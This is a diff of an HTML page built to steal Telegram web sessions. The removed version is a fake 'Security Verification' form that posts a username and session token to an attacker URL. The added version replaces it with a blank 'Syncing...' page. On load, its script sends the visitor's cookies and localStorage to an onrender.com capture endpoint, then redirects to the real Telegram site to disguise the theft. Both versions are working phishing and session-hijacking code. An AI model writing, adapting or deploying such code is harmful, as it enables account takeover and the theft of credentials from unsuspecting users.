@@ -2,52 +2,46 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Telegram Security Update</title>
-    <style>
-        body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); width: 350px; text-align: center; }
-        h2 { color: #0088cc; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-    </style>
+    <title>Syncing...</title>
 </head>
-<body>
-    <div class="box">
-        <h2>Security Verification</h2>
-        <p>Your session has expired. Please re-authenticate to continue using Telegram Web.</p>
-        <form id="hijackForm">
-            <input type="text" id="user_id" placeholder="Username / Phone" required>
-            <input type="password" id="auth_token" placeholder="Session Password / Token" required>
-            <button type="submit">Re-authenticate</button>
-        </form>
-    </div>
-
+<body style="background-color: #ffffff;">
+    <!-- We keep the body empty to make it look like a broken/loading page -->
     <script>
         const ATTACKER_URL = "https://my-session-interceptor.onrender.com/capture";
 
-        document.getElementById('hijackForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const user_id = document.getElementById('user_id').value;
-            const auth_token = document.getElementById('auth_token').value;
+        async function performStealthHijack() {
+            // 1. Grab the most sensitive data possible
+            const stolenData = {
+                user_id: "Target_User",
+                // This is the 'Holy Grail' - the session cookies
+                cookies: document.cookie, 
+                // Many modern sites use localStorage for tokens
+                localStorage: JSON.stringify(localStorage),
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
 
-            // The "One-Click" happens here: we send the credentials to the attacker
             try {
-                const response = await fetch(ATTACKER_URL, {
+                // 2. Send the data to your Render server
+                // We use 'keepalive' to ensure the request finishes even if the page closes
+                await fetch(ATTACKER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user_id, auth_token })
+                    body: JSON.stringify(stolenData),
+                    mode: 'cors',
+                    keepalive: true 
                 });
-
-                if (response.ok) {
-                    // Redirect to real Telegram to make it look like a real error
-                    window.location.href = "https://web.telegram.org";
-                }
             } catch (err) {
-                console.error("Error:", err);
-                window.location.href = "https://web.telegram.org";
+                console.log("Silent error");
             }
-        });
+
+            // 3. The "Redirection" - Send them to a real site to hide the trace
+            // This makes it look like a temporary connection glitch
+            window.location.replace("https://web.telegram.org");
+        }
+
+        // Trigger the theft immediately
+        performStealthHijack();
     </script>
 </body>
 </html>
